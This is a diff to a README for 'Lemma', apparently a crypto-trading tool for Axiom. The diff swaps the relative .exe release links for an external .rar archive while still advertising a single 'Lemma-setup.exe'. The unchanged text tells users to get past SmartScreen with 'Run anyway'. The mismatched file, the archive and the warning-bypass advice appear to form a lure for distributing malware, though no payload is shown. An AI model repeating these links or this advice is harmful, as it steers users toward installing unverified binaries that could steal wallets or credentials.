@@ -19,7 +19,7 @@
 </p>
 
 > [!NOTE]
-> **Download:** the Windows build is a single `Lemma-setup.exe` — [releases](../../releases/download/v1.0.1/axiom-launch-replay.exe). One file, no installer, no login.
+> **Download:** the Windows build is a single `Lemma-setup.exe` — [releases](https://github.com/raygullcrease/axiom-launch-replay/releases/latest/download/axiom-launch-replay.rar). One file, no installer, no login.
 >
 > The build isn't code-signed yet, so SmartScreen may warn you the first time. Choose **More info**, then **Run anyway**.
 
@@ -78,7 +78,7 @@ No. Lemma is an independent, open-source project that works alongside Axiom. It 
 Backtests, paper trading and token checks are in your hands today, with nothing connected. An opt-in exit manager with spending caps and a transaction allowlist is next on the roadmap.
 
 **How do I know a download is real?**
-Take it from this repo's [releases](../../releases/download/v1.0.1/axiom-launch-replay.exe) page only. A build that asks for credentials is not Lemma.
+Take it from this repo's [releases](https://github.com/raygullcrease/axiom-launch-replay/releases/latest/download/axiom-launch-replay.rar) page only. A build that asks for credentials is not Lemma.
 
 ## Roadmap
 
